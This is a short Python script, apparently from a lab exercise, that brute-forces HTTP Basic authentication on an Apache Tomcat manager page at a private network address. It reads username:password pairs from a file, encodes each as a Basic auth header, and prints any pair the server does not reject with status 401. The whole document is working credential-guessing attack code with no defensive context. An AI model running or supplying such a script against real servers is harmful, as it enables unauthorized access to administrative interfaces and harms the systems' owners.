import requests
import base64
url = "http://192.168.18.129:8180/manager/html"




f = open("user_password.txt",'r')

for creds in f:
	#print(creds.strip())
	encoded = base64.b64encode(creds.strip().encode())
	#print(encoded.decode())
	headers = {'Authorization':'Basic '+encoded.decode()}
	response = requests.get(url,headers=headers)
	#print(response.status_code)
	if int(response.status_code) != 401:
		print(creds.strip())


